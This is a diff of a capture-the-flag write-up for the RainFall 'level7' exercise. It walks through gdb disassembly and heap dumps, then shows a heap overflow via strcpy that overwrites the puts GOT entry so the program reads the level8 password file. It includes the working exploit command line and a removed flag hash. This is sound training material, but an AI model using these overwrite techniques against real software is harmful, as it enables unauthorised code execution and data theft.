@@ -1,3 +1,73 @@
-./level7 `python -c 'print "AAAABBBBCCCCDDDDEEEE"+"\x08\x04\x99\x28"[::-1]'` `python -c 'print "\x08\x04\x84\xf4"[::-1]'`
-5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- - 1517687627
+When we disassemble the <main> function we can find two unprotected <strcpy>, one for each argv[1] and argv[2] and a call to puts.
+
+$ (gdb) disas main
+...
+0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
+...
+0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
+...
+0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+...
+
+There is 2 malloc(8) for each argv[1] && argv[2]
+When we take a look at the heap we can see that : 
+
+gdb-peda$ r $(python -c 'print "A" * 10 ') $(python -c 'print "B" * 10 ')
+
+gdb-peda$ x/50x 0x804a000
+						(int set as 1 )
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018  <-- 0x804a018 ("AAAAAAAAAA") 
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+						(int set as 2 )
+0x804a020:	0x00004141	0x00000011	0x00000002	0x0804a038 --> 0x804a038 ("BBBBBBBBBB")
+0x804a030:	0x00000000	0x00000011	0x42424242	0x42424242
+0x804a040:	0x00004242	0x00020fc1	0x00000000	0x00000000
+0x804a050:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a060:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804a070:	0x00000000	0x00000000	0x00000000	0x00000000
+
+we need 10 more A to overwrite the 0x0804a038 and then the 2nd strcpy will write on the address we choose : 
+
+gdb-peda$ x/30x 0x804a000
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928
+0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
+
+we cannot see anymore the BBBBBB on the heap because they have been written at (0x08049928) -the puts's GOT- 
+
+gdb-peda$ x/s 0x08049928
+0x8049928 <puts@got.plt>:	 'B' <repeats 18 times>
+
+if we continue the execution we shoud have a segfault (4242424) when the binary try to call puts("~~")
+
+Stopped reason: SIGSEGV
+0x42424242 in ?? ()
+
+
+The <fgets> call stores the bytes read from "/home/user/level8/.pass" at 0x8049960.
+There is another <m> function defined but not used which makes a call to <printf> and prints the content of this address.
+
+The idea here is to replace the address of <puts> by the address of <m> this way we can read our flag.
+
+First we get our <puts> address from GOT
+
+$ objdump -R ./level7
+...
+08049928 R_386_JUMP_SLOT   puts
+...
+
+Then the add of <m> as well : 
+level7@RainFall:~$ objdump -D level7  | grep -A 5 "<m>"
+080484f4 <m>:
+ 80484f4:	55                   	push   %ebp
+ 80484f5:	89 e5                	mov    %esp,%ebp
+ 80484f7:	83 ec 18             	sub    $0x18,%esp
+ 80484fa:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048501:	e8 ca fe ff ff       	call   80483d0 <time@plt
+
+ 
+Then we use the <strcpy> to overflow the mallocs and replace our addresses
+
+./level7 $(python -c "print('A' * 20 + '\x08\x04\x99\x28'[::-1])") $(python -c "print('\x08\x04\x84\xf4'[::-1])")
